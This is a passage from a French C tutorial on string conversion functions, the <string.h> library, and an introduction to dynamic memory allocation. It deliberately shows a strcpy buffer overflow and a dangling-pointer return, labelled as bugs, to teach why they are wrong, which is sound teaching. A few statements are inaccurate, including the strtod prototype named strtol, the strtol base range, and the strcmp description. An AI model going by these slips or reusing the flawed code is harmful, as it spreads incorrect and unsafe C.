Dans ce qui va suivre, nous allons vous montrer quelques fonctions simples qui manipulent des chaines de caractère. Ces fonctions que nous allons voir permettent de convertir une chaîne de caractères en nombre. Elles sont définies dans <stdlib.h> . A quoi peuvent-elles bien servir ? Elles s'avèrent utiles dans le cas d'une calculatrice par exemple : l'utilisateur rentre une chaîne de caractère qui contient des nombres, ceux-ci sont convertis en valeurs numériques, et on peut effectuer des calculs sur eux. strtol - Convertir une chaîne en long Commençons par strtol . Cette fonction lit une chaîne de caractères et tente de la convertir en long . Elle s'arrête au premier caractère qui n'est pas un chiffre (sont toutefois tolérés : des espaces ainsi qu'un signe + ou - avant le nombre). Paramètres Cette fonction prend trois paramètres : le premier est la chaîne de caractères que l'on souhaite convertir ; le deuxième est l'adresse d'un pointeur sur char qui servira à savoir où la fonction à rencontrer une erreur (si elle en rencontre une). Notez que l'on peut ne pas l'utiliser en passant un pointeur nul ; la base dans laquelle on veut convertir la chaîne, qui doit être comprise entre deux et trente-deux. La fonction retourne le nombre converti si elle réussi, sinon zéro en cas d'échec ou LONG_MIN/LONG_MAX si la conversion donne un nombre trop petit/grand pour être stocké dans un long (auquel cas la variable errno est mise à ERANGE). long strtol ( const char * nptr , char ** endptr , int base ); stroul Il existe une variante de cette fonction pour convertir une chaîne en unsigned long cette fois : strtoul (). Cette fonction prend les mêmes paramètres que strtol (), seul la valeur de retour change : unsigned long int strtoul ( const char * nptr , char ** endptr , int base ) Voici un programme qui demande une chaîne de caractères et une base avant de tenter de convertir cette chaîne en nombre, suivi de quelques résultats. #include <errno.h> #include <stdio.h> #include <stdlib.h> int main ( void ) { char tab [ 256 ]; char * ptr ; int base ; long n ; int c ; printf ( \"Entrez une chaine : \" ); if ( scanf ( \"%255s\" , tab ) != 1 ) { printf ( \"Erreur lors de la saisie du nombre. \\n \" ); return EXIT_FAILURE ; } while (( c = getchar ()) != '\\n' && c != EOF ) ; printf ( \"Entrez une base : \" ); if ( scanf ( \"%d\" , & base ) != 1 ) { printf ( \"Erreur lors de la saisie de la base. \\n \" ); return EXIT_FAILURE ; } errno = 0 ; n = strtol ( tab , & ptr , base ); if ( * ptr == '\\0' && errno != ERANGE ) printf ( \"%s en base %d = %ld \\n \" , tab , base , n ); else { printf ( \"Une erreur s'est produite lors de la conversion. \\n \" ); printf ( \"Il reste : %s \\n \" , ptr ); } return 0 ; } Entrez une chaine : 12345 Entrez une base : 10 12345 en base 10 = 12345 Entrez une chaine : 12345 Entrez une base : 16 12345 en base 16 = 74565 Entrez une chaine : 3615salut Entrez une base : 10 Une erreur s'est produite lors de la conversion. Il reste : salut Entrez une chaine : 999999999999999999999999999 Entrez une base : 10 Une erreur s'est produite lors de la conversion. Il reste : strtod - Convertir une chaîne en double Ensuite, on doit parler de la fonction strtod (). Cette fonction va convertir une chaine de caractère en double . Elle fonctionne presque comme les fonctions strtol () et strtoul (). Le comportement est identique mais les paramètres sont néanmoins différents. Le premier paramètre est toujours la chaîne de caractère que l'on souhaite convertir, le deuxième est toujours l'adresse d'un pointeur sur char qui sert à repérer les erreurs, mais le troisième n'existe plus. double strtol ( const char * nptr , char ** endptr ); Voilà, nous venons de découvrir les chaînes de caractères. De nouvelles possibilités s'offrent à nous ! Enfin ... pour l'instant, on est limité. Comment récupérer la longueur d'une chaîne par exemple, ou encore comparer deux chaînes pour savoir si elles sont identiques ou différentes ? Heureusement, nous allons combler ce manque dans le chapitre suivant consacré à la découverte d'une bibliothèque consacrée aux chaînes de caractères : <string.h> L'en-tête Nous savons déclarer des chaînes de caractères et les initialiser, mais pour l'instant, ça s'arrête là. Dans cette partie, nous allons découvrir quelques fonctions de la bibliothèque standard qui permettent d'effectuer des opérations diverses sur les chaînes, comme calculer la taille ou bien copier une chaîne dans une autre. Tous les prototypes de ces fonctions sont définis dans le fichier d'en-tête <string.h> . Pour pouvoir les utiliser, vous allez devoir 'inclure comme ceci : #include <string.h> Chose étonnante, <string.h> ne contient pas que des fonctions qui manipulent des chaînes de caractères : ce fichier d'en-tête fourni aussi des fonctions qui travaillent directement sur des blocs de mémoire. Nous allons découvrir tout cela au cours de ce chapitre. Longueur La première fonction que nous allons examiner est strlen , comme str ing len gh, soit longueur de chaîne . Cette fonction va nous permettre de récupérer la taille de n'importe quelle chaîne de caractères sans compter le '\\0' final. Résultat La fonction retourne un size_t . Pour ceux qui ne se rappellent pas, size_t est un type qui sert à stocker les tailles de données assez grosses, comme les tableaux ou les chaînes de caractères. C'est donc normal que strlen donne un résultat de type size_t . Il a été inventé parce que sur certaines machines, il est possible de créer des données tellement grosses qu'on ne peut pas stocker leur taille dans un simple int ou un unsigned int . Argument Comme on le déduit de son utilité, cette fonction va prendre en argument une chaine de caractère dont il faut donner la taille. Ce paramètre est de type const char * : on a un pointeur sur char constant. Le lien entre pointeurs et tableaux se retrouve encore une fois. A notez la présence de const , qui empêchera toute modification, volontaire ou non, de la chaîne. Prototype De ce qu'on vient de dire précédemment, on en déduit que son prototype est le suivant : size_t strlen ( const char * str ); Exemple Illustrons ce code par un exemple. Je veux connaitre la taille de cette chaîne : \"Bonjour les amis!\" . J'utilise donc strlen qui me renverra le nombre de caractères de cette chaîne. char chaine [] = \"Bonjour les amis!\" ; printf ( \"Taille de la chaîne = %u \\n \" , ( unsigned ) strlen ( chaine )); Taille de la chaine = 17 Copie strcpy - Copier une chaîne Après strlen , qui permet de connaitre la longueur d'une chaine, voici le tour de strcpy . La fonction strcpy copie une chaîne dans une autre chaîne et renvoie un pointeur sur cette dernière. Elle copie tous les caractères, y compris le caractère nul '\\0' . Pour vous souvenir de ce que cette fonction fait, vous devez savoir que strcpy est l'abréviation de str ings c o py soit copie de chaînes . Prototype Son prototype est le suivant : char * strcpy ( char * dest , const char * src ); Ses deux arguments sont d'abord la chaine de destination, puis la chaine source. Débordements chaotiques Cependant, strcpy a un léger problème. Elle ne fait aucune vérification sur les longueurs des chaînes sources et de destination. Si la chaîne de destination est trop petite pour recevoir toute la chaîne d'origine, la fonction strcpy ne s'en aperçoit pas. Conséquence : elle écrase les données situées après. Par exemple, voici un exemple de copie qui fonctionne, mais qui écrase des données : char bug [ 5 ]; /* chaîne de destination trop petite donc problème */ strcpy ( bug , \"bonjour\" ); Pour information, certains pirates utilisent ce comportement pour faire exécuter des programmes malicieux. C'est ce qu'on appelle l'attaque par buffer overflow . Cela peut sembler ennuyeux, et dans les faits ça l'est. Autre détail : si jamais les deux chaines se recouvrent (c'est-à-dire si un morceau de la première chaine est inclus dans la seconde ou réciproquement), le comportement de strcpy est indéfini. En clair : les deux chaînes doivent être séparées et bien distinctes et doivent occuper des zones de mémoire bien séparées, sans recouvrements. Par exemple, si on souhaite copier une chaine dans elle-même, le résultat de strcpy est indéterminé. Même chose si on veut copier un morceau d'une chaine dans elle-même. Si les concepteurs du C ont décidés que strcpy aurait ce comportement, c'est encore une fois pour des raisons de performances. Effectuer des vérifications sur les longueurs des chaînes sources et de destinations, ça prend du temps. Et dans un langage conçu pour la performance, c'est niet ! strncpy - Copie partielle d'une chaîne Passons maintenant à la fonction strncpy . Cette fonction est quasiment identique à la précédente, sauf que strncpy ne copie qu'un certain nombre de caractères. Au lieu de copier toute la chaine source dans la chaine de destination (comportement de strcpy ), on peut demander à strncpy de ne copier que $n$ caractères. Prototype Voici le prototype de cette fonction : char * strncpy ( char * dest , const char * src , size_t n ); Comme on le voit, la valeur de retour est la même que pour la fonction strcpy : il s'agit d'un pointeur qui pointe sur la chaine de destination. Arguments Passons maintenant aux arguments. Les deux premiers arguments sont, dans l'ordre, la chaine de destination, suivie de la chaine source. Le troisième argument est le nombre de caractères à copier. Conséquences imprévues Si cette fonction peut appraraître comme une bonne alternative à la fonction strcpy de prime abord, sachez qu'il n'en est rien ! Tout d'abord, celle-ci souffre des même problèmes que strcpy : d'une part, elle ne fait aucune vérification sur la longueur respective des chaines et, d'autre part, si jamais les deux chaines se recouvrent, son comportement est indéterminé. Ensuite, elle dispose de son propre lots de problèmes : si la chaîne source est plus petite que la chaîne de destination, elle ajoute des caractères nuls en lieu et place des caractères manquants (ce qui nuit aux performances) ; à l'inverse, si la chaîne de destination est plus petit que la chaîne source et que la taille maximale spécifiée correspond à celle de la chaine de destination, cette dernière ne sera pas terminée par un caractère nul. Vous me demanderez sans doute pourquoi cette fonction existe si elle pose autant problème ? La réponse est simple : elle n'a en vérité pas été conçue pour la manipulation de chaîne de caractères, mais pour la manipulation de champ de taille fixe (la notion de champ sera discutée dans le chapitre consacré aux structures). En bref, oubliez cette fonction lorsque vous manipulez des chaînes de caractères. Comparaisons strcmp - Comparer deux chaînes La fonction strcmp permet de comparer deux chaînes de caractères, lettre par lettre. Pour s'en souvenir, il suffit de se dire que strcmp est l'abréviation de str ings c o mp are, qui veut dire comparaison de chaînes en anglais. Argument Cette fonction strcmp prend deux arguments : ces deux arguments ne sont rien d'autre que les deux chaînes à comparer. Comme on ne modifie pas les chaînes, ils sont tous les deux constants. Valeur de retour Petit détail : cette fonction ne renvoie pas un booléen, comme on pourrait s'y attendre. Elle renvoie une valeur entière qui sera négative, nulle ou positive si la première chaîne est respectivement plus petite, de même taille ou plus grande que la deuxième chaîne. Elle se base sur l'ordre alphabétique des lettres pour comparer les deux chaines de caractères. Prototype Voici donc son prototype : int strcmp ( const char * chaine1 , const char * chaine2 ); Exemple Illustrons son utilisation par un exemple très simple où je compare deux chaînes : char chaine1 [] = \"bonjour\" ; char chaine2 [] = \"bonsoir\" ; if ( strcmp ( chaine1 , chaine2 ) == 0 ) { puts ( \"Les chaines sont identiques.\" ); } else { puts ( \"Les chaines sont differentes.\" ); } Ce code affiche, sans surprise : Les chaines sont différentes. strncmp - Comparer deux chaînes partiellement Il existe une variante de la fonction strncmp qui permet de comparer des portions de chaines de caractères au lieu de chaines de caractères complètes. Plus précisément, strncmp permet de ne comparer que les $n$ premiers char de nos deux chaînes. Cela permet de vérifier que les $n$ premiers caractères sont identiques ou différents. Valeur de retour Son comportement est identique à strcmp : elle renvoie une valeur entière qui sera négative, nulle ou positive si la première chaîne est respectivement plus petite, de même taille ou plus grande que la deuxième chaîne. Arguments Cette fonction prend 3 paramètres. Elle prend notamment des pointeurs vers les deux chaînes de caractères à comparer. Le dernier paramètre est le nombre de char qu'il faut comparer, le fameux nombre $n$ mentionné plus haut. Par exemple, si jamais je ne veux comparer que les 3 premières lettres, j'enverrais 3 comme paramètre. Si au contraire je veux en comparer 5, alors j'enverrais 5 à la fonction. Prototype Voici son prototype : int strncmp ( const char * s1 , const char * s2 , size_t n ); Exemple char chaine1 [] = \"bonjour\" ; char chaine2 [] = \"bonsoir\" ; const int n = 3 ; if ( strncmp ( chaine1 , chaine2 , n ) == 0 ) { puts ( \"Les deux chaines sont identiques.\" ); } else { puts ( \"Les deux chaines sont differentes.\" ); } Les deux chaines sont identiques. On demande à comparer les 3 premiers octets, et vu que les trois premiers caractères sont identiques, l'ordinateur affiche que les chaînes sont identiques. Si on avait pris une valeur plus élevée, il aurait affiché « Les deux chaines sont différentes » . Recherche strchr - Rechercher un caractère La fonction strchr permet de rechercher un caractère en particulier dans une chaîne. Pour vous en souvenir plus efficacement, il suffit de savoir que strchr est l'abréviation de str ing ch aracte r . Valeur de retour Si notre fonction trouve le caractère à chercher, elle renvoie un pointeur sur ce caractère, sinon elle renvoie NULL ; si le caractère est présent plusieurs fois, elle renvoie un pointeur sur la première occurrence de ce caractère. Chose importante à retenir : toujours bien vérifier que la fonction ne retourne pas NULL et agir en conséquence si c'est le cas. Paramètres Le premier paramètre est la chaîne dans laquelle on doit effectuer la recherche, le deuxième paramètre étant le caractère à rechercher. Il est de type int , ce qui ne change rien car au final les lettres sont des chiffres pour l'ordinateur. Prototype De ce qu'on vient de dire précédemment, on en déduit que son prototype est le suivant : char * strchr ( const char * str , int c ); Exemple Illustrons par un exemple : je veux chercher la première occurrence de la lettre 'l' dans la phrase \"Cours sur le langage C\" . char chaine [] = \"Cours sur le langage C\" ; char * str = strchr ( chaine , 'l' ); if ( str != NULL ) { /* notation équivalente à str[0], revoyez le chapitre sur les tableaux si vous ne vous en rappelez plus */ printf ( \"%c \\n \" , * str ); } Comme strchr a trouvé le caractère que je cherchais, elle a retourné un pointeur sur ce caractère. Remarque Au fait, petite astuce : rien n'empêche de considérer ce pointeur comme un pointeur sur une chaine. Dans ce cas, ce pointeur pointe sur le reste de la chaine de caractère, lettre 'l' inclue. Ainsi, le code suivant : char chaine [] = \"Cours sur le langage C\" ; char * str = strchr ( chaine , 'l' ); if ( str != NULL ) { puts ( str ); } affiche ceci : le langage C strrchr - La cousine de strchr Au fait, strchr possède une cousine. La fonction strrchr fait la même chose mais elle retourne un pointeur sur le dernier caractère rencontré. C'est la seule différence ; tout ce qui a été dit précédemment est valable aussi pour strrchr . strpbrk - Rechercher une liste de caractères Avec la fonction strchr vue précédemment, on sait trouver la première occurrence d'un caractère dans une chaine (ou la dernière, avec strrchr ). C'est très bien, mais on peut faire mieux. Imaginez que je veuille faire la même chose, non pas avec une seule lettre, mais avec plusieurs. Par exemple, avec strchr , je peux savoir où se situe le premier 'l' dans une chaine. Mais pour trouver où se situe la première lettre qui est soit un 'l' , soit un 'a' , je ne peux le faire avec strchr tout seul. On peut ruser, et utiliser un petit bout de code, mais le fait est que cette situation a déjà été prévue par les concepteurs du C. Pour ce faire, on a inventé la fonction strpbrk . Valeur de retour Cette fonction est différente de strchr et strrchr en un point : au lieu de ne rechercher qu'un seul caractère, elle recherche le premier caractère parmi une liste de caractères. Si elle trouve un des caractères à chercher, elle renvoie un pointeur sur ce caractère. Sinon elle renvoie NULL. Prototype Son prototype est le suivant : char * strpbrk ( const char * str , const char * c ); Paramètres Le premier paramètre est la chaîne dans laquelle on doit effectuer la recherche, le deuxième paramètre étant la liste de caractères à rechercher. Exemple Prenons un exemple : je veux chercher les caractères 'u' , 't' et 'l' dans la phrase \"Salut aux lecteurs !\" . char chaine [] = \"Salut aux lecteurs !\" ; char * str = strpbrk ( chaine , \"utl\" ); if ( str != NULL ) printf ( \"Premiere occurrence de u, t ou l : %s \\n \" , str ); Comme la fonction a trouvé un des caractères que l'on voulait, elle s'arrête et renvoie un pointeur sur ce caractère : Première occurrence de u, t ou l : lut aux lecteurs ! Là encore, la seule chose à retenir est de vérifier le retour de la fonction. strstr - Rechercher une chaîne dans une autre Et enfin, nous terminons cet aperçu des fonctions de recherche en parlant de strstr . La fonction strstr va rechercher si une chaîne de caractères est inclue dans une autre. Son rôle est donc de rechercher des sous-chaînes. Par exemple, si je prends la chaine \"le langage C\" , je sais que la chaîne \"langage\" est inclue dedans. Pareil pour les chaînes \"lang\" , \"gage C\" , etc. Valeur de retour Si elle trouve la chaîne à chercher, elle renvoie un pointeur sur cette chaîne, sinon elle renvoie NULL. Paramètres Le premier paramètre est la chaîne dans laquelle il faut effectuer la recherche, et le deuxième est la chaîne à rechercher. Prototype Son prototype est le suivant : char * strstr ( const char * str1 , const char * str2 ); Exemple Supposons que je veuille chercher le mot \"langage\" dans la phrase \"Cours sur le langage C\" . char chaine [] = \"Cours sur le langage C\" ; char * str = strstr ( chaine , \"langage\" ); if ( str != NULL ) puts ( str ); Comme la fonction a trouvé la chaîne à chercher, elle s'arrête et renvoie un pointeur sur cette chaîne : langage C Il n'y a pas beaucoup de différence avec la fonction précédente, si ce n'est que strstr recherche toute la chaîne et pas seulement un ou plusieurs caractère(s). Autres strcat - Concaténer deux chaînes La fonction strcat sert à concaténer deux chaînes, c'est à dire simplement coller deux chaînes l'une à la suite de l'autre. Par exemple, si je concatène les chaînes \"im\" et \"puissant\" , j'obtiendrais la chaîne \"impuissant\" . Autre exemple : si je concatène la chaîne \"abc\" avec la chaîne \"def\" , j'obtiendrai \"abcdef\" . Pour vous souvenir de ce que fais cette fonction, sachez que srtcat est l'abréviation de str ings c onc at enation, ce qui signifie concaténation de chaînes en anglais. Prototype Le prototype de strcat est le suivant : char * strcat ( char * dest , const char * src ); Ce prototype est assez instructif. Il nous apprend que notre fonction strcat va concaténer le contenu d'une chaîne source à la suite d'une chaîne de destination. Elle renvoie un pointeur sur cette dernière. La chaîne source n'est pas modifiée, mais la chaîne de destination l'est. Exemple Illustration avec un exemple dans lequel je veux concaténer les phrases \"bon\" et \"jour\" : char dest[50] = \"bon\"; const char * src = \"jour\"; printf(\"Avant : %s\\n\", dest); strcat(dest, src); /* on concatène */ printf(\"Apres : %s\\n\", dest); Ce qui donne ceci à l'écran : Avant : bon Après : bonjour Attention ! Tout comme strcpy , la fonction strcat ne contrôle pas la longueur des chaînes passées en paramètre. Soyez donc prudent pour ne pas écraser des données. strncat - Concaténer partiellement Je ne sais pas si vous vous souvenez (mais vous devriez), mais strcpy avait une cousine du nom de strncpy , qui ne copiait qu'une partie de la chaîne à copier. Et bien strcat possède aussi une cousine du même genre. Il s'agit de la fonction strncat . Cette fonction fait la même chose que la précédente, sauf qu'elle ne concatène qu'une partie de la chaîne de destination. Au lieu de placer toute la chaîne source à la suite de la chaine de destination (comportement de strcat ), on peut demander à strncat de ne copier que $n$ caractères. Prototype Voici son prototype : char * strncat ( char * dest , const char * src , size_t n ); Comme on le voit, son prototype est identique à celui de strcat , le seul nouvel argument étant le nombre de caractères à concaténer. Exemple char dest [ 50 ] = \"bon\" ; const char * src = \"jour\" ; int n = 2 ; printf ( \"Avant : %s \\n \" , dest ); strncat ( dest , src , n ); printf ( \"Resultat : %s\" , dest ); Avant : bon Resultat : bonjo Attention bis Tout comme strcat , la fonction strncat ne vérifie pas la taille des chaînes passées en paramètres. Évitez donc de déborder. Exercices Palindromes Un palindrome, vous savez ce que c'est ? Non, ce n'est pas une race de lutin. C'est simplement un texte qui se lit de la même façon qu'on le lise de droite à gauche. Par exemple, le mot RADAR est un palindrome. Mais cela fonctionne aussi pour les phrases. C'est le cas pour les phrases suivantes : \"un art luxueux ultra nu\", \"Engage le jeu que je le gagne\", etc. D'ordinaire, on ne tient pas compte des accents, trémas, cédilles ou des espaces. Mais pour cet exercice, on utilisera une définition plus stricte d'un palindrome : on tiendra compte des espace, trémas, etc. Énoncé Votre mission, si vous l'acceptez, sera de créer une fonction capable de vérifier si une chaîne de caractères est un palindrome. Celle-ci renverra 1 si la chaîne de caractère passée en entrée est bien un palindrome ou zéro si non. Correction Ne regardez la correction qu'après avoir vraiment cherché. Changeons de registre, jouons au validateur Connaissez-vous le validateur de xHTML ? Il s'agit d'un programme, présenté sous la forme de site web, qui vérifie que le code HTML d'une certaine page web est valide , autrement dit que c'est bel et bien du HTML. Les pages sont composées de balises , comme <strong> ou <h1> , qui doivent impérativement être refermées (respectivement par </strong> et </h1> ). C'est la première règle du HTML et d'ailleurs la première vérifiée par le validateur : toutes les balises doivent être refermées. Nous allons tenter d'écrire un programme qui vérifie cette règle. Votre mission Cependant, le HTML est un langage trop compliqué pour notre niveau actuel. Nous allons donc considérer un langage simplifié : celui des parenthèses. Eh oui, les programmeurs et les mathématiciens connaissent bien cette règle qui veut que toutes les parenthèses doivent être refermées . Nous allons donc écrire un vérificateur de parenthèses. C'est certes moins exaltant que le validateur, mais le principe de base est rigoureusement le même, le reste étant des détails concernant la lecture des balises. Écrivez un programme qui lit une ligne constituée de parenthèses, et vérifie que chaque parenthèse est bien refermée. Par exemple, Entrez une expression avec des parenthèses : > )))((( L'expression n'est pas bien parenthésée. Pour corser le travail, vous pouvez également ajouter des crochets [] et des accolades {} . Ce travail est réalisé par toutes sortes de compilateurs et validateurs. Un indice ? Encore et toujours, il faudra lire les caractères en boucle. Mais après ? Compter les parenthèses ouvrantes et les parenthèses fermantes ne suffit pas. Autrement, une expression telle que \")))(((\" serait acceptée, alors qu'elle n'est pas bien parenthésée. En réalité, il suffit de compter le nombre de parenthèses encore à refermer. S'il vous en reste zéro à la fin, tout va bien. Sinon, ou si vous en avez un nombre négatif, problème ! Correction ! Tada ! Et voici la correction ! Cette correction est un petit peu plus longue que les autres. N'hésitez pas à l'expérimenter chez vous, à essayer de l'améliorer. Si cet exercice vous a plus, sachez qu'il est inspiré d'un domaine appelé les langages formels. Nous avons écrit un automate reconnaissant le langage de Dyck. C'est plus impressionnant dit comme cela, mmh ? Recodons la bibliothèque standard Pour s'entraîner, on va recoder quelques fonctions que l'on a vu dans ce chapitre. Pour que ce ne soit pas trop long, je vous propose d'en recoder quatre : strlen , strcpy , strcat et strcmp . Si vous le souhaitez, vous pouvez également coder leurs cousines respectives,voire coder les autres fonctions que nous avons vu dans ce chapitre. L'exercice n'est pas compliqué, réfléchissez simplement à ce que fait la fonction de la bibliothèque standard et comment reproduire son comportement. Bonne chance à tous ! Correction Alors cet exercice, ça été ? Oui, non ? L'essentiel est que vous ayez cherché, même si vous n'avez pas trouvé, ou seulement à moitié. N'hésitez pas à réessayer plus tard, avec d'autres fonctions, c'est comme ça que vous y arriverez. En attendant, voilà la correction : de my_strlen ; de my_strcpy ; de my_strcat ; et de my_strcmp . Malgré quelques désagréments, la bibliothèque <string.h> est quand même bien pratique. En plus, les fonctions qui la composent sont intéressantes à recoder. Si d'ailleurs vous voulez continuer à vous entrainer, il reste plein de fonctions à recoder. Vous pouvez même en inventer de nouvelles, c'est à vous de voir. Dans le prochain chapitre, nous replongerons dans la mémoire et nous verrons un autre façon de déclarer ses variables : l'allocation dynamique . L'allocation dynamique Dans les chapitres précédents, nous avons vu comment créer des structures, des tableaux et des chaînes de caractères. Mais il y a un petit problème : comment faire si on désire avoir un tableau (ou une chaîne de caractère) dont la taille n'est pas fixée une bonne fois pour toute ? C'est possible, mais on ne sait pas encore comment. De plus, nos structures de données complexes, comme les tableaux, chaînes de caractères, et structures, n'ont pas besoin d'exister durant toute la vie d'un programme. Pas mal d'entre elles doivent avoir une vie éphémère : ces données complexes peuvent être crées et disparaitre suivant les besoins. On peut se demander pourquoi ce comportement. La raison est simple : nos données complexes prennent de la mémoire RAM, qui est en quantité limitée. Réserver de façon permanente de la mémoire pour chaque donnée dont on aurait besoin reviendrait à se tirer une balle dans le pied. Pour limiter la casse, il est possible de réserver une portion inutilisée de la mémoire pour stocker temporairement des données complexes. Quand un programme a besoin d'un peu plus de mémoire pour stocker une donnée complexe, il peut ainsi réserver une partie vide de la mémoire, et se l'approprier pour stocker une donnée. Quand on n'a plus besoin de cette mémoire, on la libère, et elle sera réutilisable à volonté. C'est ce qu'on appelle l' allocation dynamique . Comme vous vous en doutez, ce chapitre parlera de cette fameuse allocation dynamique. Vous verrez qu'il en existe plusieurs formes, et vous verrez aussi comment l'utiliser. Vous apprendrez notamment à utiliser certaines fonctions d'allocation dynamique disponibles en C. Durée de vie Jusqu'à présent, nous vous avons simplement expliqué qu'il existe plusieurs type de mémoire (registre, mémoire cache, RAM et disque dur) et que vos variables sont stockées soit dans des registres, soit dans la RAM. Mais nos variables, tableaux et structures ne sont pas éternelles. Variables et données peuvent exister durant un certain temps et disparaitre ensuite. Elles occupent ainsi temporairement de la mémoire, qui peut être réutilisée lors de leur disparition. Cette portion de mémoire, utilisée pour stocker une variable, un tableau, ou une structure, c'est ce qu'on appelle un objet . Ce n'est rien de moins qu'un gros bloc de mémoire, placé en RAM, qui va servir à stocker notre donnée. La différence entre variable, tableau, structure, etc, et un objet est assez simple : c'est la différence entre le contenant et le contenu. Cet objet a quelques particularités. Il stocke une certaine donnée : int , char , tableau, structure, etc. Mais il a aussi une durée de vie . La durée de vie d'un objet détermine la portion de l'exécution du programme durant laquelle son espace mémoire est réservé pour une donnée ou une variable. Dit plus simplement, elle détermine la période durant laquelle un objet existe, à savoir quand est-il réservé et quand est-il libéré. Durant cette durée de vie, notre objet est utilisé pour une variable ou une donnée en particulier. Une fois sa durée de vie terminée, la mémoire occupée par la variable / donnée est libérée et peut être utilisée pour autre chose, une autre variable, etc. Il existe trois durées de vie pour les objets : automatique ; statique ; dynamique. Voyons ces trois durées de vie dans l'ordre, en commençant par la durée de vie automatique. Automatique La durée de vie automatique est celle qui correspond aux variables, structures, tableaux, etc ; déclarés dans un bloc d'instruction. Un objet de durée de vie automatique est crée lors de l'entrée dans le bloc d'instructions auquel il appartient et est détruit à la fin de l'exécution de celui-ci. Il en va donc ainsi des variables locales aux fonctions de même que de leurs paramètres. Pour illustrer le principe, le code suivant est donc incorrect car p essaye d'accéder à un objet qui n'existe plus (la variable n a été détruite lors de la sortie de la fonction ptr*). static int * ptr ( void ) { int n = 10 ; return & n ; } int main ( void ) { int * p = ptr (); * p = 20 ; return 0 ; } La zone mémoire qui contient des objets automatiques est appelée la pile . Au passage, un objet à durée de vie automatique est initialisé à chaque fois qu'il est crée. Par exemple, si vous initialisez des variables locales dans une fonction, elles le sont à chaque appel ; ainsi, la pile se vide et se remplit au fur et à mesure du programme. Statique Vient ensuite la durée de vie statique. Un objet de durée de vie statique est crée lors du lancement du programme et est détruit à la fin de celui-ci. C'est donc un objet qui existe de façon \"permanente\". Vous avez certainement du tilter en voyant le mot statique, et cela vous a surement rappelé quelque chose qu'on a vu dans les chapitres précédents. Et bien vous avez raison : les variables déclarées avec le mot-clé static à l'intérieur d'un bloc d'instruction a bel et bien une durée de vie statique. Mais ce ne sont pas les seules : les variables déclarées en dehors de tout bloc d'instruction ont elles aussi une durée de vie statique. Initialisation automatique Au fait : ces données statiques sont initialisées une seule fois lors de l'exécution du programme. Si le programmeur ne les initialise pas lui-même, ces dernières le seront automatiquement. Pour les entiers, cette initialisation les met à 0. Pour les flottants, ils sont initialisés à 0.0. Quand aux pointeurs, ceux-ci sont initialisés à NULL. Exemple Ainsi, ce code : #include <stdio.h> static int plus ( void ) { static int i ; return i ++ ; } int main ( void ) { int i ; for ( i = plus (); i < 5 ; i = plus ()) printf ( \"%d \\n \" , i ); return 0 ; } vous affichera : 0 1 2 3 4 Étant donné que la variable i de la fonction plus est automatiquement initialisée à zéro et qu'elle n'est détruite qu'à la fin du programme (elle conserve donc sa valeur lors des appels successifs à la fonction plus ). Dynamique Un objet de durée de vie dynamique est crée et détruit à la demande du programmeur et est stocké dans le tas . L'intérêt de pouvoir gérer la durée de vie de différents objets est d'éviter les inconvénients propres aux objets de durée de vie automatique et statique. Du côté des objets de durée de vie automatique, le problème est qu'ils sont détruits à la fin du bloc auquel ils appartiennent. Il est donc impossible de les utiliser en dehors du bloc de code dans lesquels on les a crées. On peut citer l'exemple des variables locales d'une fonction. Pour ces dernières, ce n'est pas trop grave si on n'a qu'une seule donnée simple, vu qu'on peut le retourner : on peut retourner un int , un char , ou autre chose sans problème. Mais si on veut en retourner plusieurs, ou retourner une donnée plus complexe comme un tableau ou une structure, c'est impossible s'il sont déclarés avec une durée de vie automatique. Le problème pourrait être contourné à l'aide d'objets de durée de vie statique, mais ce n'est pas très pratique car ces derniers sont persistants (ils ne sont détruits qu'à la fin du programme). De ce fait, si vous manipulez des données de tailles importantes, mais dont vous n'avez besoin que durant un certain temps, vous monopolisez de la mémoire pour rien. Et c'est sans compter les cas où la taille de la donnée n'est pas connue à la compilation et dépend de paramètres extérieurs : difficile de réserver de la mémoire si on ne sait pas de quelle quantité on a besoin. La solution consiste donc à pouvoir créer et détruire des objets sur demande. Pour permettre au programmeur d'en créer, le langage de programmation doit fournir de quoi réserver de la mémoire. Cette réservation est plus ou moins bien cachée suivant le langage. Et en C, rien n'est masqué : vous pouvez vous même allouer (réserver) de la mémoire à la main et la libérer. Bien sûr, cela n'est pas sans conséquences : si vous oubliez de libérer la mémoire quand vous n'en avez plus besoin, vous allez rapidement la remplir, ce qui risque d'entrainer de sérieux problèmes. Pour éviter de laisser la gestion de la mémoire au programmeur, certains langages sont capables de libérer eux-même la mémoire : ils incorporent ce qu'on appelle un garbage collector , un petit morceau de programme qui se charge de détecter les blocs de mémoire réutilisables et de les libérer à votre place. C'est le cas en Java par exemple, mais pas en C. Aussi, vous devez apprendre à gérer la mémoire à la main, en utilisant des fonctions fournies par le langage C. Malloc et consoeurs Le C fourni diverses fonctions qui permettent de réserver un bloc de mémoire afin de pouvoir l'utiliser comme bon nous semble. Ces fonctions d'allocation dynamique sont au nombre de quatre, et elles sont définies dans l'en-tête <stdlib.h> . Pensez donc bien à l'inclure dans vos programmes en utilisant la déclaration de fichier d'en-tête suivante : #include <stdlib.h> Maintenant, il faut voir comment nous allons devoir utiliser ces fonctions d'allocation mémoire. Schéma à suivre Lorsque l'on souhaite faire une allocation dynamique, il y a un certain nombre d'étapes à suivre. Certaines peuvent sembler lourdes et inutiles, mais c'est à l'ardeur et la rigueur qu'il code que l'on reconnaît un bon programmeur. Ce schéma, que je vous invite fortement à suivre, est le suivant : Déclarer un pointeur : le pointeur va servir à contenir l'adresse de l'élément que l'on va allouer. Appeler la fonction d'allocation : cette fonction va s'occuper d'allouer un espace mémoire en fonction des paramètres qu'on lui passe. Vérifier le retour de la fonction : si la fonction a réussi à allouer un espace mémoire, elle retourne un pointeur sur cet espace. Cependant il se peut que dans certains cas (pas assez de mémoire, demande d'allocation trop importante, etc), la fonction échoue, et dans ce cas elle retourne NULL. Il faut donc tester notre pointeur : s'il vaut NULL, l'allocation a échoué, et on quitte le programme. Une fois que l'on ne souhaite plus utiliser l'espace mémoire, on libère la zone allouée : c'est important, sinon on retombe sur le risque vu précédemment à savoir une saturation du tas. Examinons à présent ces quatre fonctions. malloc - Allouer de la mémoire La première de ces fonctions est malloc . C'est la plus simple de toute. Cette fonction va simplement réserver un gros bloc de mémoire pour que l'utilisateur puisse l'utiliser comme il le souhaite. Petite remarque : le bloc de mémoire réservé par malloc n'est pas modifié ni initialisé. Celui peut donc contenir n'importe quoi. Arguments Évidemment, si on veut réserver de la mémoire, on doit préciser quelle est la taille du bloc de mémoire voulu. Pour cela, il suffit de préciser la taille du bloc en argument de malloc , et la fonction réservera celui-ci. L'argument de malloc sert donc à préciser sa taille. On pourrait se dire naïvement que cette taille est un nombre 